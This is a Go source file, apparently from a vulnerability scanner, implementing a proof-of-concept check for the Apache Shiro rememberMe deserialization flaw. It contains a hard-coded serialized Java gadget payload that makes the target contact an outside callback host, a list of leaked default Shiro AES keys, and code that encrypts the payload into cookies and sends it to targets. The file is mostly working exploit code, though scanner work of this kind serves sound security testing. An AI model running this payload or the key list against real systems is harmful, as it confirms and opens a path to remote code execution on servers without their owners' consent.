package scripts

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"github.com/jweny/pocassist/pkg/cel/proto"
	reverse2 "github.com/jweny/pocassist/pkg/cel/reverse"
	"github.com/jweny/pocassist/pkg/util"
	"github.com/valyala/fasthttp"
	"strings"
	//"net"
)

const basePayload string = "\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01sr\x00\x0cjava.net.URL\x96%76\x1a\xfc\xe4r\x03\x00\x07I\x00\x08hashCodeI\x00\x04portL\x00\tauthorityt\x00\x12Ljava/lang/String;L\x00\x04fileq\x00~\x00\x03L\x00\x04hostq\x00~\x00\x03L\x00\x08protocolq\x00~\x00\x03L\x00\x03refq\x00~\x00\x03xp\xff\xff\xff\xff\xff\xff\xff\xfft\x00\x1eREVERSEURLt\x00\x00q\x00~\x00\x05t\x00\x04httppxt\x00%http://1234567890123456.d.megadns.comx"

//参考：https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw
var ShiroKeys = []string{
	//注释为Github搜索结果的数量
	"kPH+bIxk5D2deZiIxcaaaA==", //300,但是是老版本Shiro默认的Key
	"Z3VucwAAAAAAAAAAAAAAAA==", //879,官方更新后的Key
	"4AvVhmFLUs0KTA3Kprsdag==", //5000
	"3AvVhmFLUs0KTA3Kprsdag==", //997
	"2AvVhdsgUs0FSA3SDFAdag==", //352
	"U3ByaW5nQmxhZGUAAAAAAA==", //95
	"wGiHplamyXlVB11UXWol8g==", //93
	"6ZmI6I2j5Y+R5aSn5ZOlAA==", //69

}

func PKCS7Padding(origData []byte, blockSize int) []byte {
	//计算需要补几位数
	padding := blockSize - len(origData)%blockSize
	//在切片后面追加char数量的byte(char)
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)

	return append(origData, padtext...)
}

func EncodeRememberme(reverseUrl, key string) string {

	BytesKey, _ := base64.StdEncoding.DecodeString(key)

	iv_str := util.RandLetterNumbers(16)
	iv := []byte(iv_str)
	block, _ := aes.NewCipher(BytesKey)
	mode := cipher.NewCBCEncrypter(block, iv)

	Payload := strings.Replace(basePayload, "REVERSEURL", reverseUrl, 1)
	PayloadBytes := PKCS7Padding([]byte(Payload), aes.BlockSize)

	ciphertext := make([]byte, aes.BlockSize+len(PayloadBytes))
	mode.CryptBlocks(ciphertext[aes.BlockSize:], PayloadBytes)
	copy(ciphertext, iv)
	return base64.StdEncoding.EncodeToString(ciphertext)
}

//Shiro反序列化漏洞
func ShiroJavaUnserilize(args *ScriptScanArgs) (*util.ScanResult, error) {
	rawUrl := ConstructUrl(args, "/")

	fastReq := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(fastReq)
	fastReq.SetRequestURI(rawUrl)
	fastReq.Header.SetMethod(fasthttp.MethodGet)

	// 定义报文列表
	var respList []*proto.Response

	var cookies [][]string

	for _, key := range ShiroKeys {
		reverse := reverse2.NewReverse()
		reverseUrl := reverse.Url.String()
		rememberme := EncodeRememberme(reverseUrl, key)
		cookies = append(cookies, []string{"rememberMe", rememberme})
		for i := range cookies {
			fastReq.Header.SetCookie(cookies[i][0], cookies[i][1])
		}
		resp, err := util.DoFasthttpRequest(fastReq, false)
		if err != nil {
			util.ResponsePut(resp)
			return nil, err
		}

		isShiro := false
		for key, _ := range resp.Headers {
			if key == "rememberMe" {
				isShiro = true
			}
		}
		if !isShiro {
			return &util.InVulnerableResult, nil
		}

		if reverse2.ReverseCheck(reverse, 5) {
			respList = append(respList, resp)
			return util.VulnerableHttpResult(rawUrl, "",respList),nil
		}
		util.ResponsePut(resp)
	}
	return &util.InVulnerableResult, nil
}
func init() {
	ScriptRegister("poc-go-shiro-unserialize-550", ShiroJavaUnserilize)
}
